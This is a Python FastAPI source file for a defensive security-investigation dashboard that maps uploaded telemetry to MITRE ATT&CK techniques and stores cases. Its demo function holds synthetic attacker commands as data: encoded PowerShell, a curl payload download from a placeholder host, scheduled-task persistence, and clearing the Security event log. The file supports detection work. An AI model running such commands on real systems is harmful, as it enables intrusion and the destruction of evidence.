from __future__ import annotations

import json
import secrets
from pathlib import Path
from typing import Any

from fastapi import FastAPI, File, Form, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

from .cases import CaseStore
from .engine import MitreMapper
from .intelligence import build_report_context
from .loaders import discover_rule_paths, load_rules
from .models import AnalysisResult
from .telemetry import load_telemetry_bytes

PACKAGE_DIR = Path(__file__).parent
TEMPLATES = Jinja2Templates(directory=PACKAGE_DIR / "templates")


def create_app(custom_rules: Path | None = None, case_directory: Path | None = None) -> FastAPI:
    app = FastAPI(title="BLACKTERM // INVESTIGATION PLATFORM", version="1.0.0")
    app.mount("/static", StaticFiles(directory=PACKAGE_DIR / "static"), name="static")
    mapper = MitreMapper(load_rules(discover_rule_paths(custom_rules)))
    store = CaseStore(case_directory)
    investigations: dict[str, list[AnalysisResult]] = {}

    @app.get("/", response_class=HTMLResponse)
    async def dashboard(request: Request) -> HTMLResponse:
        return TEMPLATES.TemplateResponse(
            request=request,
            name="dashboard.html",
            context={"recent_cases": [_case_summary(x) for x in store.list()[:8]], "platform": _platform_summary(store)},
        )

    @app.post("/api/analyze-command")
    async def analyze_command(command: str = Form(...)) -> JSONResponse:
        command = command.strip()
        if not command:
            raise HTTPException(status_code=400, detail="Command cannot be empty")
        result = mapper.analyze_command(command, source="dashboard-command")
        return _new_investigation([result], investigations)

    @app.post("/api/upload")
    async def upload_events(file: UploadFile = File(...)) -> JSONResponse:
        filename = file.filename or "uploaded-events.json"
        if not filename.lower().endswith((".json", ".jsonl", ".evtx")):
            raise HTTPException(status_code=400, detail="Upload a .json, .jsonl, or .evtx file")
        raw = await file.read()
        if len(raw) > 50 * 1024 * 1024:
            raise HTTPException(status_code=413, detail="File exceeds the 50 MB dashboard limit")
        try:
            events = load_telemetry_bytes(raw, filename)
        except (UnicodeDecodeError, json.JSONDecodeError, ValueError, RuntimeError) as exc:
            raise HTTPException(status_code=400, detail=str(exc)) from exc
        results = [mapper.analyze_event(event, source=filename) for event in events]
        return _new_investigation(results, investigations)

    @app.post("/api/demo")
    async def demo_investigation() -> JSONResponse:
        """Create a local, synthetic investigation for product evaluation."""
        events = _demo_events()
        results = [mapper.analyze_event(event, source="BLACKTERM demo telemetry") for event in events]
        return _new_investigation(results, investigations)

    @app.post("/api/cases/{case_id}")
    async def save_case(case_id: str, request: Request) -> JSONResponse:
        body = await request.json()
        title = str(body.get("title", "Untitled investigation")).strip()[:100]
        notes = str(body.get("notes", "")).strip()[:5000]
        results = investigations.get(case_id)
        if results is None:
            existing = store.get(case_id)
            if existing is None:
                raise HTTPException(status_code=404, detail="Investigation not found")
            results_payload = existing.get("results", [])
            view = existing.get("view", empty_context())
        else:
            results_payload = [item.model_dump(mode="json") for item in results]
            view = serialize_context(results)
        record = store.save(case_id, {
            "title": title or "Untitled investigation",
            "notes": notes,
            "results": results_payload,
            "view": view,
        })
        return JSONResponse({"case": _case_summary(record), "view": view})

    @app.get("/api/cases")
    async def list_cases() -> JSONResponse:
        return JSONResponse({"cases": [_case_summary(x) for x in store.list()]})

    @app.get("/api/cases/{case_id}")
    async def get_case(case_id: str) -> JSONResponse:
        record = store.get(case_id)
        if record is None:
            raise HTTPException(status_code=404, detail="Case not found")
        return JSONResponse({"case": _case_summary(record), "view": record.get("view", {})})

    @app.delete("/api/cases/{case_id}")
    async def delete_case(case_id: str) -> JSONResponse:
        if not store.delete(case_id):
            raise HTTPException(status_code=404, detail="Case not found")
        investigations.pop(case_id, None)
        return JSONResponse({"deleted": True})

    @app.get("/api/investigations/{investigation_id}")
    async def get_investigation(investigation_id: str) -> JSONResponse:
        results = investigations.get(investigation_id)
        if results is None:
            raise HTTPException(status_code=404, detail="Investigation not found")
        return JSONResponse({"investigation_id": investigation_id, "view": serialize_context(results)})

    @app.get("/api/platform")
    async def platform() -> JSONResponse:
        return JSONResponse(_platform_summary(store))

    @app.get("/api/health")
    async def health() -> dict[str, Any]:
        return {"status": "ok", "rules": len(mapper.rules), "version": "1.0.0", "product": "BLACKTERM Platform"}

    return app



def _platform_summary(store: CaseStore) -> dict[str, Any]:
    records = store.list()
    cases = [_case_summary(item) for item in records]
    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "informational": 0}
    tactic_counts: dict[str, int] = {}
    technique_counts: dict[str, dict[str, Any]] = {}

    for record, case in zip(records, cases):
        severity = case.get("overall_severity", "informational")
        severity_counts[severity] = severity_counts.get(severity, 0) + 1
        view = record.get("view") or {}
        for tactic in view.get("tactics", []):
            if tactic.get("active"):
                key = tactic.get("id") or tactic.get("label", "unknown").lower().replace(" ", "-")
                tactic_counts[key] = tactic_counts.get(key, 0) + int(tactic.get("count", 1))
        for technique in view.get("technique_counts", []):
            technique_id = technique.get("technique_id") or technique.get("id")
            if not technique_id:
                continue
            current = technique_counts.setdefault(technique_id, {
                "technique_id": technique_id,
                "technique_name": technique.get("technique_name", technique_id),
                "count": 0,
            })
            current["count"] += int(technique.get("count", 1))

    top_techniques = sorted(technique_counts.values(), key=lambda item: item["count"], reverse=True)[:6]
    return {
        "case_count": len(cases),
        "event_count": sum(int(case.get("event_count", 0)) for case in cases),
        "mapping_count": sum(int(case.get("mapping_count", 0)) for case in cases),
        "highest_risk": max((int(case.get("max_risk", 0)) for case in cases), default=0),
        "severity_counts": severity_counts,
        "tactic_counts": tactic_counts,
        "top_techniques": top_techniques,
        "recent_cases": cases[:6],
        "activity": [
            {
                "case_id": case.get("case_id"),
                "title": case.get("title"),
                "severity": case.get("overall_severity"),
                "risk": case.get("max_risk"),
                "events": case.get("event_count"),
                "updated_at": case.get("updated_at"),
            }
            for case in cases[:8]
        ],
        "modules": [
            {"id": "mitre", "name": "MITRE Mapper", "status": "online", "description": "Map telemetry to ATT&CK and investigate behavior."},
            {"id": "tracegrid", "name": "TRACEGRID", "status": "planned", "description": "Correlate events into attack timelines and cases."},
            {"id": "sentinel", "name": "SENTINEL", "status": "external", "description": "Network visibility, asset inventory, and change detection."},
            {"id": "phishscan", "name": "PHISHSCAN", "status": "external", "description": "Phishing URL and infrastructure investigation."},
            {"id": "iocforge", "name": "IOCForge", "status": "planned", "description": "Store, tag, enrich, and export indicators."},
            {"id": "ruleforge", "name": "RuleForge", "status": "planned", "description": "Create and validate reusable detection rules."},
        ],
    }


def _demo_events() -> list[dict[str, Any]]:
    """Synthetic telemetry that exercises a realistic defensive workflow."""
    return [
        {
            "@timestamp": "2026-07-31T22:01:00Z",
            "host": {"name": "WS-104"},
            "user": {"name": "tdeppa"},
            "process": {
                "name": "powershell.exe",
                "command_line": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=",
                "parent": {"name": "winword.exe"},
            },
            "source": {"ip": "10.0.0.25"},
        },
        {
            "@timestamp": "2026-07-31T22:02:15Z",
            "host": {"name": "WS-104"},
            "user": {"name": "tdeppa"},
            "process": {
                "name": "curl.exe",
                "command_line": "curl https://updates.example.test/agent.exe -o C:\\Users\\Public\\agent.exe",
            },
            "destination": {"ip": "203.0.113.44", "port": 443},
            "url": {"full": "https://updates.example.test/agent.exe"},
        },
        {
            "@timestamp": "2026-07-31T22:03:32Z",
            "host": {"name": "WS-104"},
            "user": {"name": "tdeppa"},
            "process": {
                "name": "schtasks.exe",
                "command_line": "schtasks /create /tn SystemUpdate /tr C:\\Users\\Public\\agent.exe /sc onlogon",
            },
        },
        {
            "@timestamp": "2026-07-31T22:04:09Z",
            "host": {"name": "WS-104"},
            "process": {
                "name": "wevtutil.exe",
                "command_line": "wevtutil cl Security",
            },
        },
        {
            "@timestamp": "2026-07-31T22:05:21Z",
            "host": {"name": "WS-104"},
            "process": {
                "name": "cmd.exe",
                "command_line": "cmd.exe /c whoami && ipconfig /all && netstat -ano",
            },
        },
    ]


def _new_investigation(results: list[AnalysisResult], investigations: dict[str, list[AnalysisResult]]) -> JSONResponse:
    investigation_id = secrets.token_hex(5)
    investigations[investigation_id] = results
    return JSONResponse({"investigation_id": investigation_id, "view": serialize_context(results)})


def _case_summary(record: dict[str, Any]) -> dict[str, Any]:
    view = record.get("view") or {}
    return {
        "case_id": record.get("case_id"),
        "title": record.get("title", "Untitled investigation"),
        "notes": record.get("notes", ""),
        "created_at": record.get("created_at"),
        "updated_at": record.get("updated_at"),
        "event_count": view.get("event_count", 0),
        "mapping_count": view.get("mapping_count", 0),
        "max_risk": view.get("max_risk", 0),
        "overall_severity": view.get("overall_severity", "informational"),
    }


def parse_events(text: str, filename: str) -> list[dict[str, Any]]:
    if filename.lower().endswith(".jsonl"):
        events: list[dict[str, Any]] = []
        for number, line in enumerate(text.splitlines(), start=1):
            if not line.strip():
                continue
            item = json.loads(line)
            if not isinstance(item, dict):
                raise ValueError(f"JSONL line {number} must contain an object")
            events.append(item)
        if not events:
            raise ValueError("The JSONL file did not contain any events")
        return events

    parsed = json.loads(text)
    if isinstance(parsed, dict):
        return [parsed]
    if isinstance(parsed, list) and parsed and all(isinstance(item, dict) for item in parsed):
        return parsed
    raise ValueError("JSON must be an object or a non-empty array of objects")


def empty_context() -> dict[str, Any]:
    return {
        "event_count": 0, "mapping_count": 0, "ioc_count": 0, "max_risk": 0,
        "overall_severity": "informational", "summary": "No telemetry loaded.",
        "platforms": [], "tactics": [], "technique_counts": [], "all_iocs": {},
        "results_view": [], "relationship_graph": {"nodes": [], "edges": []},
        "recommendations": [],
    }


def serialize_context(results: list[AnalysisResult]) -> dict[str, Any]:
    context = build_report_context(results)
    result_views = []
    for item in context["results_view"]:
        result = item["result"]
        result_views.append({
            "sequence": item["sequence"], "timestamp_label": item["timestamp_label"],
            "time_short": item["time_short"], "primary_action": item["primary_action"],
            "iocs": item["iocs"], "evidence_quality": item["evidence_quality"],
            "matched_evidence": item["matched_evidence"], "entities": item["entities"],
            "event_id": result.event_id, "source": result.source, "risk_score": result.risk_score,
            "highest_severity": result.highest_severity, "event": result.event,
            "mappings": [mapping.model_dump(mode="json") for mapping in result.mappings],
        })
    return {
        "event_count": context["event_count"], "mapping_count": context["mapping_count"],
        "ioc_count": context["ioc_count"], "max_risk": context["max_risk"],
        "overall_severity": context["overall_severity"], "summary": context["summary"],
        "platforms": context["platforms"], "tactics": context["tactics"],
        "technique_counts": context["technique_counts"], "all_iocs": context["all_iocs"],
        "results_view": result_views, "relationship_graph": context["relationship_graph"],
        "recommendations": build_recommendations(result_views),
    }


def build_recommendations(items: list[dict[str, Any]]) -> list[str]:
    ids = {m["technique_id"] for item in items for m in item["mappings"]}
    tactics = {t for item in items for m in item["mappings"] for t in m["tactics"]}
    actions: list[str] = []
    if "T1059.001" in ids:
        actions += ["Review PowerShell Script Block and Module logs.", "Decode and safely inspect encoded PowerShell content."]
    if "T1070.001" in ids:
        actions += ["Collect remote or forwarded event logs before evidence is lost.", "Check for gaps in Security, System, and PowerShell logs."]
    if "credential-access" in tactics:
        actions += ["Reset exposed credentials and inspect authentication activity."]
    if "lateral-movement" in tactics:
        actions += ["Review remote logons and isolate affected hosts if activity is unauthorized."]
    if "command-and-control" in tactics:
        actions += ["Block confirmed malicious destinations and preserve network telemetry."]
    if any(item["risk_score"] >= 70 for item in items):
        actions.insert(0, "Validate the alert immediately and consider isolating the affected endpoint.")
    if not actions:
        actions = ["Review surrounding telemetry and verify whether the observed activity was authorized."]
    return list(dict.fromkeys(actions))[:6]


app = create_app()
